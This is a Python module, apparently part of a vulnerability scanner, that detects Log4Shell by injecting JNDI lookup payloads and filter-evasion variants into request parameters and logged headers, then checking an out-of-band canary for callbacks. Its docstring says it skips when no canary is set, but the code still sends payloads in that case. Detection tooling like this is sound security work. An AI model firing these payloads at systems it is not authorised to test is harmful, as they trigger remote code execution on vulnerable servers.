"""Log4Shell / JNDI injection (CVE-2021-44228 & friends) — OOB, canary only.

Injects ${jndi:...} payloads pointing ONLY at the configured verification canary
domain, into parameters and commonly-logged request headers. A callback to the
canary confirms server-side JNDI resolution (critical RCE). Skips entirely when
no canary is configured.
"""
from __future__ import annotations

from modules.base import BaseModule, ScanContext, register
from core.result import Finding, Severity
from core.injection_points import discover_points, send

# Headers frequently written to logs (and thus evaluated by vulnerable Log4j).
LOG_HEADERS = ["User-Agent", "Referer", "X-Forwarded-For", "X-Forwarded-Host",
               "X-Api-Version", "X-Client-IP", "True-Client-IP", "Origin",
               "X-Requested-With", "Forwarded"]


def _payloads(host: str) -> list[str]:
    return [
        "${jndi:ldap://%s/a}" % host,
        "${jndi:dns://%s}" % host,
        "${jndi:rmi://%s/a}" % host,
        # Common lookup-obfuscation bypasses.
        "${${lower:j}ndi:${lower:l}dap://%s/a}" % host,
        "${${::-j}${::-n}${::-d}${::-i}:ldap://%s/a}" % host,
    ]


@register
class Log4Shell(BaseModule):
    id = "log4shell"
    name = "Log4Shell / JNDI Injection (OOB)"
    category = "Injection"
    description = "Injects ${jndi:...} canary payloads into params/headers; OOB callback confirms RCE. Canary required."

    def _blind(self, ctx: ScanContext) -> list[Finding]:
        """No canary: inject JNDI payloads anyway (candidate-only — needs OOB to confirm)."""
        host = "nemesis-oob.invalid"
        tested: list[str] = []
        points = discover_points(ctx)
        ctx.log(f"    (no canary) Log4Shell: injecting JNDI into {len(points)} param point(s) + headers")
        for pt in points:
            if ctx.should_stop():
                break
            for payload in _payloads(host):
                if ctx.should_stop():
                    break
                send(ctx, pt, payload)
            tested.append(f"param {pt.label()}")
        for header in LOG_HEADERS:
            if ctx.should_stop():
                break
            try:
                ctx.paced_request("GET", ctx.target, headers={header: _payloads(host)[0]})
            except Exception:
                pass
            tested.append(f"header {header}")
        # Log4Shell is blind: without an OOB canary there is no in-band signal, so we
        # inject the payloads (they may land in your OOB logs elsewhere) but emit NO
        # finding — reporting "payloads sent" would be a false positive.
        return []

    def run(self, ctx: ScanContext) -> list[Finding]:
        oob = ctx.oob
        if oob is None or not oob.enabled:
            return self._blind(ctx)
        findings: list[Finding] = []
        tested: list[str] = []
        poll = bool(oob.poll_url)

        # 1) Parameters.
        points = discover_points(ctx)
        if points:
            ctx.log(f"    injecting JNDI into {len(points)} param point(s)")
        for pt in points:
            if ctx.should_stop():
                break
            token = oob.new_token("l4p")
            for payload in _payloads(oob.host(token)):
                if ctx.should_stop():
                    break
                send(ctx, pt, payload)
            tested.append(f"param {pt.label()} -> {oob.host(token)}")
            if poll and oob.check(token):
                findings.append(Finding(
                    module_id=self.id, title=f"Log4Shell RCE via {pt.label()}",
                    severity=Severity.CRITICAL, url=pt.base_url, confidence="Confirmed",
                    description="JNDI lookup to the canary resolved server-side — remote code execution.",
                    evidence=f"Canary token {token} ({oob.host(token)})",
                    request=f"{pt.method} {pt.base_url} ({pt.param}=<jndi>)",
                    remediation="Patch Log4j (>=2.17.1); set log4j2.formatMsgNoLookups; remove JndiLookup."))

        # 2) Headers.
        if not ctx.should_stop():
            for header in LOG_HEADERS:
                if ctx.should_stop():
                    break
                token = oob.new_token("l4h")
                try:
                    ctx.paced_request("GET", ctx.target,
                                      headers={header: _payloads(oob.host(token))[0]})
                except Exception:
                    pass
                tested.append(f"header {header} -> {oob.host(token)}")
                if poll and oob.check(token):
                    findings.append(Finding(
                        module_id=self.id, title=f"Log4Shell RCE via '{header}' header",
                        severity=Severity.CRITICAL, url=ctx.target, confidence="Confirmed",
                        description=f"JNDI payload in '{header}' triggered a server-side lookup (RCE).",
                        evidence=f"Canary token {token} ({oob.host(token)})",
                        remediation="Patch Log4j; disable message lookups."))

        if not poll and tested:
            findings.append(Finding(
                module_id=self.id, title="Log4Shell canary payloads sent — verify OOB logs",
                severity=Severity.INFO, url=ctx.target, confidence="Tentative",
                description="No OOB poll logger configured; check your canary logs for any JNDI callback.",
                evidence="\n".join(tested[:60]),
                remediation="Configure an OOB poll URL for auto-confirmation, or inspect canary logs."))
        return findings
